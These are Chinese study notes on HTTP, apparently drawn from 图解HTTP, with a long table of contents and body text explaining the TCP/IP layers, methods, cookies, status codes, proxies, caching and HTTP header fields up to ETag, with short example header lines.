* [HTTP和它相关的各协议](#http和它相关的各协议)
* [URL和URI](#url和uri)
* [一次简单的http请求](#一次简单的http请求)
* [告知服务器意图的HTTP方法](#告知服务器意图的http方法)
* [持久连接和管线化](#持久连接和管线化)
* [无状态协议和cookie](#无状态协议和cookie)
* [HTTP报文及一个简单样例](#http报文及一个简单样例)
* [压缩和分块传输](#压缩和分块传输)
* [发送多种数据的多部分对象集合](#发送多种数据的多部分对象集合)
* [获取部分内容的范围请求](#获取部分内容的范围请求)
* [内容协商](#内容协商)
* [HTTP状态码](#http状态码)
* [与HTTP协作的web服务器](#与http协作的web服务器)
  * [单台虚拟主机实现多个域名](#单台虚拟主机实现多个域名)
  * [代理](#代理)
  * [网关](#网关)
  * [隧道](#隧道)
  * [资源的缓存](#资源的缓存)
* [HTTP首部](#http首部)
  * [End\-to\-end首部和Hop\-by\-hop首部](#end-to-end首部和hop-by-hop首部)
  * [Cache\-Control（通用首部）](#cache-control通用首部)
  * [Connection（通用首部）](#connection通用首部)
  * [Date（通用首部）](#date通用首部)
  * [Pragma（通用首部）](#pragma通用首部)
  * [Trailer（通用首部）](#trailer通用首部)
  * [Transfer\-Encoding（通用首部）](#transfer-encoding通用首部)
  * [Upgrade（通用首部）](#upgrade通用首部)
  * [Via（通用首部）](#via通用首部)
  * [Warning（通用首部）](#warning通用首部)
  * [Accept（请求首部）](#accept请求首部)
  * [Accept\-Charset（请求首部）](#accept-charset请求首部)
  * [Accept\-Encoding（请求首部）](#accept-encoding请求首部)
  * [Accept\-Language（请求首部）](#accept-language请求首部)
  * [Authorization（请求首部）](#authorization请求首部)
  * [Expect（请求首部）](#expect请求首部)
  * [From（请求首部）](#from请求首部)
  * [Host（请求首部）](#host请求首部)
  * [If\-Match（请求首部）](#if-match请求首部)
  * [If\-Modified\-Since（请求首部）](#if-modified-since请求首部)
  * [If\-None\-Match（请求首部）](#if-none-match请求首部)
  * [If\-Range（请求首部）](#if-range请求首部)
  * [If\-Unmodified\-Since（请求首部）](#if-unmodified-since请求首部)
  * [Max\-Forwards（请求首部）](#max-forwards请求首部)
  * [Proxy\-Authorization（请求首部）](#proxy-authorization请求首部)
  * [Range（请求首部）](#range请求首部)
  * [Referer（请求首部）](#referer请求首部)
  * [TE（请求首部）](#te请求首部)
  * [User\-Agent（请求首部）](#user-agent请求首部)
  * [Accept\-Ranges（响应首部）](#accept-ranges响应首部)
  * [Age（响应首部）](#age响应首部)
  * [ETag（响应首部）](#etag响应首部)
  * [Location（响应首部）](#location响应首部)
  * [Proxy\-Authenticate（响应首部）](#proxy-authenticate响应首部)
  * [Retry\-After（响应首部）](#retry-after响应首部)
  * [Server（响应首部）](#server响应首部)
  * [Vary（响应首部）](#vary响应首部)
  * [WWW\-Authenticate（响应首部）](#www-authenticate响应首部)
  * [Allow（实体首部）](#allow实体首部)
  * [Content\-Encoding（实体首部）](#content-encoding实体首部)
  * [Content\-Language（实体首部）](#content-language实体首部)
  * [Content\-Length（实体首部）](#content-length实体首部)
  * [Content\-Location（实体首部）](#content-location实体首部)
  * [Content\-MD5（实体首部）](#content-md5实体首部)
  * [Content\-Range（实体首部）](#content-range实体首部)
  * [Content\-Type（实体首部）](#content-type实体首部)
  * [Expires（实体首部）](#expires实体首部)
  * [Last\-Modified（实体首部）](#last-modified实体首部)
  * [Cookie和Set\-Cookie](#cookie和set-cookie)
  * [其他首部字段](#其他首部字段)
* [HTTPS](#https)
  * [HTTP的缺点1:通信使用明文可能会被监听](#http的缺点1通信使用明文可能会被监听)
  * [HTTP的缺点2：可能遭遇伪装身份](#http的缺点2可能遭遇伪装身份)
  * [HTTP的缺点3：报文可能已被篡改](#http的缺点3报文可能已被篡改)
  * [HTTPS简介](#https简介)
  * [加密算法](#加密算法)
  * [证书](#证书)
* [确认访问身份的认证](#确认访问身份的认证)
  * [BASIC 认证](#basic-认证)
  * [DIGEST 认证](#digest-认证)
  * [SSL 客户端认证](#ssl-客户端认证)
  * [基于表单认证](#基于表单认证)
* [基于HTTP的追加协议](#基于http的追加协议)
  * [SPDY](#spdy)
  * [全双工通信的WebSocket](#全双工通信的websocket)
  * [其他](#其他)
* [构建Web内容的技术](#构建web内容的技术)
  * [Servlet](#servlet)
* [Web的攻击技术](#web的攻击技术)
  * [主动攻击和被动攻击](#主动攻击和被动攻击)
  * [输出值转义不完全引发的漏洞](#输出值转义不完全引发的漏洞)
    * [针对web应用的防护](#针对web应用的防护)
    * [跨站脚本攻击XSS](#跨站脚本攻击xss)
    * [SQL注入攻击](#sql注入攻击)
    * [OS命令注入攻击](#os命令注入攻击)
    * [HTTP首部注入攻击](#http首部注入攻击)
    * [邮件首部注入攻击](#邮件首部注入攻击)
    * [目录遍历攻击](#目录遍历攻击)
    * [远程文件包含漏洞](#远程文件包含漏洞)
  * [设计缺陷引发的漏洞](#设计缺陷引发的漏洞)
    * [强制浏览](#强制浏览)
    * [不正确的错误信息处理](#不正确的错误信息处理)
    * [开放重定向](#开放重定向)
  * [会话管理疏忽引发的漏洞](#会话管理疏忽引发的漏洞)
    * [会话劫持](#会话劫持)
    * [会话固定攻击](#会话固定攻击)
    * [跨站点请求伪造](#跨站点请求伪造)
  * [其他安全漏洞](#其他安全漏洞)
    * [密码破解](#密码破解)
    * [点击劫持](#点击劫持)
    * [Dos攻击](#dos攻击)
    * [后门程序](#后门程序)
* [TCP/IP基础知识](#tcpip基础知识)
  * [计算机与网络发展的阶段](#计算机与网络发展的阶段)
  * [协议](#协议)
  * [传输方式的分类](#传输方式的分类)
  * [地址](#地址)
  * [网络的构成要素](#网络的构成要素)
  * [TCP/IP协议分层模型](#tcpip协议分层模型)
* [数据链路](#数据链路)
  * [数据链路相关技术](#数据链路相关技术)
    * [MAC地址](#mac地址)
    * [共享介质型网络](#共享介质型网络)
    * [非共享介质型网络](#非共享介质型网络)
    * [半双工和全双工通信](#半双工和全双工通信)
    * [根据MAC地址转发](#根据mac地址转发)
    * [环路检测技术](#环路检测技术)
    * [VLAN虚拟局域网](#vlan虚拟局域网)
  * [以太网](#以太网)
    * [帧格式](#帧格式)
  * [无线通信](#无线通信)
  * [PPP协议](#ppp协议)
  * [其他数据链路](#其他数据链路)
    * [ATM](#atm)
  * [公共网络](#公共网络)
    * [模拟电话线路](#模拟电话线路)
    * [移动通信服务](#移动通信服务)
    * [ADSL](#adsl)
    * [FTTH](#ftth)
    * [有线电视](#有线电视)
    * [专线](#专线)
    * [VPN](#vpn)
    * [公共无线LAN](#公共无线lan)
    * [其他公共无线通信服务](#其他公共无线通信服务)
* [IP协议](#ip协议)
  * [IP基础知识](#ip基础知识)
    * [IP地址和路由控制](#ip地址和路由控制)
    * [数据链路的抽象化](#数据链路的抽象化)
    * [IP属于面向无连接型](#ip属于面向无连接型)
  * [IP地址的基础知识](#ip地址的基础知识)
    * [IP地址的定义](#ip地址的定义)
    * [IP地址的分类](#ip地址的分类)
    * [广播和多播](#广播和多播)
    * [子网掩码](#子网掩码)
    * [CIDR和VLSM](#cidr和vlsm)
    * [全局地址和私有地址](#全局地址和私有地址)
  * [路由控制](#路由控制)
  * [IP分割与再构成](#ip分割与再构成)
  * [IPv6](#ipv6)
    * [地址的分类](#地址的分类)
  * [IPv4首部](#ipv4首部)
  * [IPv6首部](#ipv6首部)
* [IP协议相关技术](#ip协议相关技术)
  * [DNS](#dns)
  * [ARP和RARP](#arp和rarp)
  * [ICMP](#icmp)
    * [ICMPv6](#icmpv6)
  * [DHCP](#dhcp)
  * [NAT](#nat)
    * [NAPT](#napt)
    * [NAT\-PT/NAPT\-PT](#nat-ptnapt-pt)
  * [IP隧道](#ip隧道)
  * [IGMP](#igmp)
  * [IP任播](#ip任播)
  * [通信质量控制](#通信质量控制)
  * [显式拥塞通知](#显式拥塞通知)
  * [Mobile IP](#mobile-ip)
* [TCP和UDP](#tcp和udp)
  * [传输层](#传输层)
  * [端口号](#端口号)
  * [UDP](#udp)
  * [TCP](#tcp)
    * [序列号与确认机制](#序列号与确认机制)
    * [重发超时时间](#重发超时时间)
    * [连接的建立和断开](#连接的建立和断开)
    * [以段为单位发送数据](#以段为单位发送数据)
    * [滑动窗口控制](#滑动窗口控制)
    * [重发控制](#重发控制)
    * [流控制决定窗口大小](#流控制决定窗口大小)
    * [拥塞控制决定窗口大小](#拥塞控制决定窗口大小)
    * [提高网络利用率的规范](#提高网络利用率的规范)
  * [其他传输层协议](#其他传输层协议)
  * [UDP首部](#udp首部)
  * [TCP首部](#tcp首部)
* [路由协议](#路由协议)
  * [路由控制](#路由控制-1)
  * [路由控制范围](#路由控制范围)
  * [路由算法](#路由算法)
    * [距离向量算法](#距离向量算法)
    * [链路状态算法](#链路状态算法)
    * [几种路由协议的特点](#几种路由协议的特点)
  * [RIP](#rip)
  * [OSPF](#ospf)
  * [BGP](#bgp)
  * [MPLS](#mpls)
* [应用层协议](#应用层协议)
  * [远程登录](#远程登录)
    * [TELNET](#telnet)
    * [SSH](#ssh)
  * [文件传输FTP](#文件传输ftp)
  * [电子邮件](#电子邮件)
    * [POP](#pop)
    * [IMAP](#imap)
  * [WWW](#www)
    * [URI](#uri)
  * [网络管理SNMP](#网络管理snmp)
  * [其他应用层协议](#其他应用层协议)
    * [多媒体通信实现技术](#多媒体通信实现技术)
    * [P2P](#p2p)
    * [LDAP](#ldap)
* [网络安全](#网络安全)
  * [网络安全构成要素](#网络安全构成要素)
    * [防火墙](#防火墙)
    * [IDS](#ids)
    * [反病毒和个人防火墙](#反病毒和个人防火墙)
  * [安全协议](#安全协议)
    * [IPsec与VPN](#ipsec与vpn)
    * [IEEE802\.1X](#ieee8021x)

# HTTP和它相关的各协议

Web使用一种名为HTTP（HyperText Transfer Protocol，超文本传输协议）的协议作为规范，完成从客户端到服务器的一系列运作流程。

通常使用的网络是在TCP/IP协议族的基础上运作的，而HTTP属于它内部的一个子集。

TCP/IP协议族按层次分别分为以下4层：应用层、传输层、网络层和数据链路层。分层使得设计简单，责任清晰，当某一层需要改变设计时，其他各层只要遵守之前约定好的接口，就能继续使用。

四层的概述：

1、应用层：面向用户提供的应用服务，如FTP（File Transfer Protocol，文件传输协议）、DNS（Domain Name System，域名系统）、HTTP

2、传输层：提供处于网络连接中的两台计算机之间的数据传输。分为TCP（Transmission Control Protocol，传输控制协议）和UDP（User Data Protocol，用户数据报协议）两种协议

3、网络层：处理在网络上流动的数据包，数据包是网络传输的最小数据单位，该层规定了通过怎样的路径到达对方计算机，并把数据包传送给对方。

4、链路层（又名数据链路层，网络接口层），它用来处理连接网络的硬件部分，包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡）、光纤等。

在发送端在层与层之间传输数据时，每经过一层就必定会被打上一个该层所属的首部信息，反之在接受数据时，每经过一层会把对应的首部消去，这种把数据信息包装起来的做法被称为封装：

![QQ图片20211117223405](QQ图片20211117223405.png)

IP协议

IP协议（Internet Protocol）位于网络层，IP协议的作用是把各种数据包传送给对方，其中两个重要的条件是IP地址和MAC地址，其中还会用到ARP协议，它可以根据通信方的IP地址反查对应的MAC地址。

TCP协议

TCP位于传输层，提供可靠的字节流服务，字节流服务就是为了方便传输，将大块数据分割成以报文段为单位的数据包进行管理，为了确保数据准确的到达目标，TCP采用了三次握手策略：

![QQ图片20211117224918](QQ图片20211117224918.png)

DNS服务

DNS（Domain Name System）是应用层的协议，它提供域名到IP地址之间的解析服务。

综上所述，各协议和http协议的关系是：

如果想通过http访问某个页面，首先根据DNS查询对应的IP地址，然后生成http请求报文，tcp协议将报文分割成多个报文段进行传输（接收时通过tcp协议将多个报文段重组成请求报文），然后通过IP协议进行中转和传输

# URL和URI

URL（uniform Resource Locator，统一资源定位符）就是使用web浏览器访问web页面时需要输入的网页地址。URI（uniform Resource Indentifier，统一资源标识符）是某个协议方案表示的资源的定位标识符，常用的协议有http、ftp等，它用字符串标识某一个互联网资源，而URL代表互联网中资源的地点，URL是URI的子集。

涵盖全部必要信息的绝对URI样例：

![QQ图片20211117230954](QQ图片20211117230954.png)

有一些用来指定HTTP协议技术标准的文档，它们被称为RFC（Request for Comments，征求修正意见书），通常应用程序会遵照RFC确定的标准实现，如果不按该标准执行，就有可能无法通信。不过也存在那种客户端和服务器端使用自定义的标准的情况。

# 一次简单的http请求

对于一条通信路线来说，服务器端和客户端的角色是确定的，请求先从客户端发出，然后由服务器端接受和响应，服务器端在收到请求之前不会响应。

一个具体的示例：

![QQ图片20211117233302](QQ图片20211117233302.png)

请求报文和响应报文的各部分：

![QQ图片20211117233506](QQ图片20211117233506.png)

![QQ图片20211117233519](QQ图片20211117233519.png)

其中的请求URI定位到了互联网中的资源，它可以指明一个完整的URI，也可以在首部字段中host写明网络域名或者IP地址：

![QQ图片20211117233951](QQ图片20211117233951.png)

此外，如果不是访问特定资源，而是对服务器本身发起请求，就可以用一个*来代替请求URI：

~~~
OPTIONS * HTTP/1.1
~~~

# 告知服务器意图的HTTP方法

常用的方法：

![QQ图片20211119213330](QQ图片20211119213330.png)

TRACE方法可用于查询发送出去的请求是怎样被加工修改的，它通过添加首部字段Max-Forwards来实现，如Max-Forwards值是2，没经过一个服务器就将该数字减1，直到数值为0时就停止传输，对应的服务器会将该请求返回并返回200：

![QQ图片20211120235610](QQ图片20211120235610.png)





# 持久连接和管线化

在HTTP协议的初始版本中，每进行一次HTTP通信就要断开一次TCP连接，随着HTTP的普及，文档中包含大量图片的情况多了起来，此时每次请求都会造成无谓的TCP连接建立和断开，增加通信量的开销：

![QQ图片20211119214018](QQ图片20211119214018.png)

为了解决这个问题，HTTP采用了持久连接的方法，只要任意一端没有明确提出断开连接，则保持TCP连接状态：

![QQ图片20211119214213](QQ图片20211119214213.png)

持久连接减少了TCP连接的重复建立和断开造成的额外开销，减轻了服务器端的负载。在HTTP1.1中，所有的连接默认都是持久连接。

管线化是在持久连接的基础上做的另一个改进，从前发送请求后需要等待并收到响应才能发送下一个请求，管线化技术出现后，不用等待响应就可以直接发送下一个请求：

![QQ图片20211119214430](QQ图片20211119214430.png)

这样就能做到同时并行发送多个请求，不需要一个一个等待了。

# 无状态协议和cookie

http是一个无状态协议，在http中协议不会对发送过的请求或者响应做持久化处理，每次有新的请求，总会有新的响应产生，协议不会保存之前的请求和响应信息。这是为了能更快的处理大量事务，确保协议的可伸缩性设计的。

随着web的逐渐发展，用户希望有一个保持状态的功能，cookie技术解决了此问题。

cookie会根据从服务器端发送的响应报文内的一个叫Set-Cookie的首部字段信息，通知客户端保存cookie，下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送。

服务器收到cookie后，会去检查究竟是从哪一个客户端发来的连接请求，从而获取之前的状态信息。

![QQ图片20211119214755](QQ图片20211119214755.png)

# HTTP报文及一个简单样例

HTTP报文分为请求报文和响应报文两种，它的格式都是这样的：

![QQ图片20211119220649](QQ图片20211119220649.png)

一个报文的样例：

![QQ图片20211119220843](QQ图片20211119220843.png)

请求行包括请求方法、请求URI和HTTP版本，响应行包括HTTP版本、状态码、原因短语。

首部字段分为请求首部、响应首部、通用首部、实体首部（包含在请求报文和响应报文中的实体部分所使用的首部，针对实体部分使用的首部，补充了资源内容更新时间等与实体有关的信息）四种。

首部字段是由首部字段名和字段值构成的，中间用冒号分割，格式：

~~~http
Content-Type:text/html
~~~

另外，单个HTTP首部字段可以由多个值，比如：

~~~html
Keep-Alive: timeout=15, max=100
~~~

实体其实就是HTTP报文的数据内容，分为实体首部和实体主体；报文是HTTP通信中的基本单位，报文这个概念一般来说等价于实体，除非在传输过程中进行了编码。

# 压缩和分块传输

HTTP中的内容编码会应用在实体内容的编码格式，内容编码后的实体由客户端接受并负责解码。

在HTTP通信过程中，请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面，在传输大容量数据时，通过把数据分割成多块，让浏览器逐步显示页面的功能被称为分块传输编码。

分块传输编码会将实体主体分成多个部分，每一块都会用十六进制来标记块的大小。

# 发送多种数据的多部分对象集合

HTTP中发送的一份报文主体可含有多类型实体，如图片、文本等。

多部分对象集合可以采用multipart/form-data（上传表单），也可以是multipart/byteranges（多范围内容），

表单：实体中包含多个表项

![QQ图片20211119222616](QQ图片20211119222616.png)

多范围内容，实体中包含多个部分：

![QQ图片20211119222731](QQ图片20211119222731.png)

涉及的首部字段是Content-Type，其中的boundary字段来划分各类实体。多部分对象集合的各个部分类型中，都可以含有首部字段，另外还可以在某个部分中嵌套使用多部分对象集合。

# 获取部分内容的范围请求

HTTP可以指定下载的实体范围，它也可以作为中断下载的恢复手段。

执行范围请求时，会用到首部字段Range来指定资源的byte范围：

![QQ图片20211119233915](QQ图片20211119233915.png)

针对范围请求，响应会返回状态码为206 Partial Content的响应报文，如果服务器端无法响应范围请求，则会返回状态码200OK和完整的实体内容。

# 内容协商

当浏览器的默认语言为英文或中文，访问相同的URI，则会显示对应英文版或者中文版的web页面，这样的机制被称为内容协商。

内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。相关的报文首部字段包括Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。

内容协商技术有以下3种类型：服务器驱动协商、客户端驱动协商（用户调整浏览器的选项）、透明协商（两者结合）

# HTTP状态码

首先要明确，状态码是一种规范，不代表和状况完全一致，web内部错误也可以返回200

状态码的类别：

![QQ图片20211120203137](QQ图片20211120203137.png)

2XX：成功

200 OK：正常处理请求

204 No Content：请求已处理，但是响应报文中不含实体的主体部分（无资源可返回）

206 Partial Content：范围请求执行成功

3XX：重定向

301 Moved Permanently：永久性重定向，如果已经把资源对应的URI保存为书签了，此时应该按Location首部字段提示的URI重新保存

302 Found：临时性重定向，请求的资源已经被分配了新的URI，希望用户本次用新的URI访问

303 See Other：和302有相同的功能，但是303明确表示客户端应该采用GET方法获取资源

（301/302标准是禁止将POST方法改变成GET方法的，但是实际上几乎所有浏览器都会把POST改成GET）

304 Not Modified：客户端发送附带条件的请求（If-Match等首部）时，服务器端允许请求访问资源，但是未满足条件。304不包含任何响应的主体部分。

307 Temporary Redirect：临时重定向，和302类似，但是307标准不会从POST变成GET

4XX：客户端错误

400 Bad Request：请求报文中有语法错误

401 Unauthorized：发送的请求中必须包含HTTP认证的认证信息，401的响应报文中包含质询用户信息的首部

403 Forbidden：对请求资源的访问被拒绝

404 Not Found：服务器无法找到请求的资源

5XX：服务器错误

500 Internal Server Error：服务器端内部故障

503 Service Unavailable：服务器暂时处于超负载或正在停机维护，现在无法处理请求，可以加入RetryAfter首部字段指示解除以上状况需要的时间。

# 与HTTP协作的web服务器

## 单台虚拟主机实现多个域名

HTTP1.1允许一台HTTP服务器搭建多个web站点，比如提供web托管服务的供应商，可以用一台服务器为多位客户服务，这就利用了虚拟主机的功能。

在互联网上，域名通过DNS服务映射到IP地址之后访问目标网站，当请求发送到服务器时，已经是IP地址的形式了。此时当一台服务器内托管了多个域名，此时就要搞清楚究竟要访问哪个域名，所以在发送HTTP请求时，必须在Host首部内完整指定主机名或域名的URI。

## 代理

代理是一种有转发功能的应用程序。它接受客户端发送的请求转发给服务器，同时也接受服务器返回的响应并转发给客户端：

![QQ图片20211120211055](QQ图片20211120211055.png)

在HTTP通信过程中，可级联多台代理服务器，转发时，需要附加Via首部字段以标记出经过的主机信息。

代理服务器内部可以做针对特定URI访问的控制，还可以做缓存功能（转发响应时，缓存代理会将资源的副本保存起来，再次接到相同请求后，将缓存直接返回，以减少网络带宽的流量）。

代理分为缓存代理（Caching Proxy）、透明代理（Transparent Proxy，不改变报文的）、非透明代理（对报文内容进行加工的）

## 网关

转发其他服务器通信数据的服务器。

网关可以由HTTP请求转化为其他协议通信，它可以理解为一个集群的入口，网关负责用sql查询，或者通知其他服务器作出其他响应，网关可以提高通信的安全性：

![QQ图片20211120212412](QQ图片20211120212412.png)

## 隧道

隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。

隧道可以建立一条通信线路，使用SSL等加密手段进行通信，它本身不会去解析HTTP请求，隧道会在通信双方断开连接时结束。

## 资源的缓存

缓存服务器可以减少网络带宽的流量，这就涉及到一个缓存资源有效性问题。若判定缓存失效，缓存服务器会再次从源服务器上获取资源：

![QQ图片20211120213058](QQ图片20211120213058.png)

缓存不仅可以缓存在服务器中，还可以存在客户端浏览器中，这就是临时网络文件，若缓存有效则直接从本地磁盘读取，若判定缓存过期，浏览器会再次请求新资源。

# HTTP首部

## End-to-end首部和Hop-by-hop首部

端到端首部（End-to-end Header）会将首部转发给请求或者响应的最终接受目标。而逐跳首部（Hop-by-hop Header）只对单次转发有效，会因通过缓存或代理而不再转发。HTTP1.1和之后版本中，要使用逐跳首部，需要提供Connection首部字段。

下面列举了HTTP/1.1中的逐跳首部字段，除了这8个首部字段，其他都是端到端首部：![QQ图片20211120215114](QQ图片20211120215114.png)

## Cache-Control（通用首部）

Cache-Control的指令参数是可选的，多个指令间用逗号分割，它可用于请求或者响应时：

~~~html
Cache-Control: private, max-age=0, no-cache
~~~

几个重要指令：

1、public：代表其他用户也可以利用该缓存

2、private：响应只以特定的用户作为对象，缓存服务器会对该特定用户提供资源缓存服务，对其他的用户请求不会缓存

3、no-cache：目的是为了防止从缓存中返回过期的资源

如果是请求中的no-cache，代表客户端不要缓存，而是把请求转发给源服务器；如果是响应中的no-cache，代表缓存服务器不能对资源进行缓存，源服务器也拒绝进行资源有效性确认。

在响应中它还可以有具体值：

~~~html
Cache-Control: no-cache=Location
~~~

代表客户端在收到带Location的响应报文后，就不能使用缓存，而不带Location的就可以使用缓存。

4、no-store：代表缓存不能在本地存储（和no-cache的区别在于，no-cache代表的是不缓存过期的资源，可以缓存但是每次必须进行新鲜度校验）

5、max-age：缓存时间设置

![QQ图片20211120220811](QQ图片20211120220811.png)

6、s-maxage：和max-age指令相同，不同之处是它只适用于多位用户使用的代理服务器。

7、min-fresh：指定一个单位为秒的数字，当指定为60时，请求到缓存服务器，代表值响应过期时间少于60秒的资源

8、max-stale：指定一个单位为秒的数字，代表在该范围内，即使资源过期，还是可以被客户端接受，若没有指定数字，则代表无论经过多久都可以返回给客户端。

9、only-if-cached：代表客户端只接受缓存服务器本地缓存的值，它要求缓存服务器不重新加载响应，也不确认资源有效性，若没有缓存，则返回504 Gateway Timeout

10、must-revalidate：强制验证缓存有效性，若无法获取有效资源则返回504

11、proxy-revalidate：和上面的类似

12、no-transform：缓存不能改变实体主体的媒体类型，用于防止缓存或代理压缩图片等

Cache-Control可以做一些自定义的指令，缓存服务器若能理解该指令则有效，若不能理解则会直接忽略。

## Connection（通用首部）

Connection可用于控制逐跳首部（Hop-by-hop Header），它代表对应首部不再转发：

![QQ图片20211120222014](QQ图片20211120222014.png)



Connection的第二个作用是管理持久连接，HTTP/1.1版本都是默认持久连接，当服务器端想明确断开连接时，需要发送：

~~~html
Connection：close
~~~

HTTP/1.1之前的版本默认都是非持久连接，此时若想维持持久连接，需要加上：

~~~html
Connection：Keep-Alive
~~~

## Date（通用首部）

代表创建HTTP报文的日期和时间

## Pragma（通用首部）

1.1之前版本的历史遗留字段，为HTTP/1.0的向后兼容而定义

它只有一个形式：

~~~html
Pragma：no-cache
~~~

只用于在客户端发送的请求中，代表中间服务器不返回缓存的资源。

它是为了防止中间服务器有一些无法识别1.1的Cache-Control：no-cache的情况，有时发送的请求中会同时含有上面两个首部字段。

## Trailer（通用首部）

它注明了报文主体后有哪些首部字段，用于分块传输编码的场景：

![QQ图片20211120222954](QQ图片20211120222954.png)

## Transfer-Encoding（通用首部）

规定了传输报文主体时采用的编码方式，HTTP/1.1的传输编码方式仅对分块传输编码有效，即：

~~~html
Transfer-Encoding:chunked
~~~

## Upgrade（通用首部）

用于检测HTTP协议及其他协议是否可使用更高版本进行通信，参数值可以用来指定一个完全不同的通信协议。

## Via（通用首部）

Via是为了追踪客户端与服务器之间的请求和响应报文的传输路径，报文在经过代理或者网关时，会先在首部字段Via中附加该服务器的信息，然后再进行转发：

![QQ图片20211120235724](QQ图片20211120235724.png)

首部字段Via不仅可以用于追踪报文的转发，还可以用于避免请求回环的发生。它经常会和TRACE方法一起使用。

## Warning（通用首部）

该首部是从HTTP/1.0的响应首部Retry-After演变过来的，通常会告知用户一些与缓存相关的问题的警告。

## Accept（请求首部）

Accept通知服务器，用户代理能够处理的媒体类型及媒体类型的优先级，通常用type/subtype这种形式，媒体类型的例子：

![QQ图片20211121000422](QQ图片20211121000422.png)

浏览器在发送请求时，只会请求它自己支持的媒体类型。用q来额外表示权重，权重取值是0-1，默认是1，服务器会优先返回权重值最高的媒体类型。

## Accept-Charset（请求首部）

Accept-Charset可用来通知服务器用户代理支持的字符集以及字符集的相对优先顺序。可以一次性指定多种字符集，可用q来表示相对优先级。广泛应用于内容协商的服务器驱动协商。

~~~
Accept-Charset: iso-8859-5, unicode-1-1;q=0.8
~~~

（相当于客户端指明，它想以这个字符集阅读返回的页面）

## Accept-Encoding（请求首部）

用来告知服务器，客户端支持的请求体内容编码，以及内容编码的优先级顺序，可以一次指定多种内容编码，采用q值来代表相对优先级，也可以用*来代表任何的编码格式

~~~
Accept-Encoding: gzip, deflate
~~~

几种常见的内容编码：

![QQ图片20211212214414](QQ图片20211212214414.png)

## Accept-Language（请求首部）

用来通知服务器，客户端想要的语言集类型，可以一次指定多个，用q来表示相对优先级：

~~~
Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3
~~~

## Authorization（请求首部）

Authorization用来告知服务器，客户端（用户代理）的认证信息：

~~~
Authorization: Basic dWVub3NlbjpwYXNzd29yZA==
~~~

通常需要通过服务器认证的时候，服务器会返回一个401状态码，然后浏览器会加入认证信息继续访问。

## Expect（请求首部）

指明客户端期待的某种行为：

~~~
Expect: 100-continue
~~~

100代表等待状态码

服务器无法理解客户端的期望时，会返回417 Expectation Failed

## From（请求首部）

From用来告知服务器使用用户代理的用户的电子邮件地址。有时该地址也会记录在User-Agent中。

## Host（请求首部）

Host必须包含在请求首部中，它用来告知服务器资源所处的互联网主机名和端口号：

~~~
Host: www.hackr.jp
~~~

当多个虚拟主机运行在一个IP上，会使用首部字段Host加以区分。

请求发送至服务器时，若通过IP地址找不到唯一的域名，则需要Host来指出明确的主机名，若服务器未指定主机名，则发送一个空值：

~~~
Host:
~~~

## If-Match（请求首部）

当请求资源的实体标记ETag和If-Match的值相同时，才会执行请求：

~~~
If-Match: "123456"
~~~

若不匹配则返回412 Precondition Failed

还可以使用*，此时代表服务器会忽略ETage，只要资源存在就处理请求

## If-Modified-Since（请求首部）

如果在If-Modified-Since字段指定的日期时间后，资源发生了更新，服务器会接受请求：

~~~
If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT
~~~

如果资源没有更新过，则返回304 Not Modified

这个字段用于确认客户端本地资源的有效性。获取资源的更新时间，可以通过Last-Modified来确定。

## If-None-Match（请求首部）

它与If-Match的作用想法，只有当资源的ETag值和If-None-Match的值不一致时，才会处理该请求。

它可以被用来获取最新的资源。

## If-Range（请求首部）

If-Range要配合Range一起使用，代表对应资源的ETage或者时间和If-Range的值相同，则服务器根据Range返回对应范围的数据，当做范围请求处理；若不同则返回全体资源。

若不适用If-Range而使用If-Match和Range的搭配，则服务器的资源若已经更新，则不会处理该请求，也就不会处理范围请求，此时会返回412 Precondition Failed，还要进行第二次HTTP请求，要求返回最新数据，和直接使用If-Range相比，需要花费两倍的时间。

## If-Unmodified-Since（请求首部）

它的作用和If-Modified-Since相反，作用是告知服务器，指定的请求资源只有在指定日期之后，未发生更新，才能处理请求，若不满足要求则返回412 Precondition Failed

~~~
If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT
~~~

## Max-Forwards（请求首部）

使用TRACE或者OPTIONS方法时，发送包含首部字段Max-Forwards的请求，服务器在转发该请求之前会将该值减1，当服务器接受到Max-Forwards为0的请求时，则不再转发，而是直接返回响应：

~~~
Max-Forwards: 10
~~~

![图解HTTP 彩色版@www.java1234](图解HTTP 彩色版@www.java1234.jpg)

使用HTTP时，请求可能会经过多个代理服务器，该字段一般用于定位请求失败（可能有时是某一个环节失败，有时是进入了死循环）的问题的，使用该请求后，会对代理服务器的请求路径有所了解

## Proxy-Authorization（请求首部）

它作用于客户端与代理之间的认证行为，而Authorization是作用于客户端与服务器之间的：

~~~
Proxy-Authorization: Basic dGlwOjkpNLAGfFY5
~~~

## Range（请求首部）

用于范围请求时，告知服务器资源的指定范围，如表示获取第5001字节至10000字节的资源：

~~~
Range: bytes=5001-10000
~~~

若服务器可以正确处理，则返回206 Partial Content同时返回部分数据，若处理不了则返回200 OK及全部资源

## Referer（请求首部）

告知服务器请求的原始资源URI，当直接在地址栏输入URI时一般请求中不会带这个字段，因为URI中的字符串可能含有ID和密码等保密信息，所以此时一般不会带着Referer转发给其他服务器

~~~
Referer: http://www.hackr.jp/index.htm
~~~

## TE（请求首部）

TE会告知服务器，客户端能处理响应的传输编码方式及相对优先级

~~~
TE: gzip, deflate;q=0.5
~~~

它和首部字段Accept-Encoding很像，但是用于传输编码。可以和trailer字段配合使用，完成分块传输编码，此时只需要把trailers赋值给它：

~~~
TE: trailers
~~~

## User-Agent（请求首部）

它用于传达浏览器的种类、用户代理名称等信息：

~~~
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko
~~~

当请求经过代理时，中间可能被添加上代理服务器的名称

## Accept-Ranges（响应首部）

用来告知客户端，服务器是否能处理范围请求，若能处理则返回bytes，若不能处理则返回none

## Age（响应首部）

它告知客户端，源服务器在多久前创建了响应，单位是秒

当创建响应的服务器是缓存服务器时，字段必须加上Age，代表多久前曾经向源服务器确认过响应。它指示了目前返回值的有效性

~~~
Age: 600
~~~

## ETag（响应首部）

ETag是资源的唯一性标识，服务器会为每个资源分配一个ETag，当资源更新时，ETag也需要更新。

~~~
ETag: "82e22293907ce725faf67773957acd12"
~~~

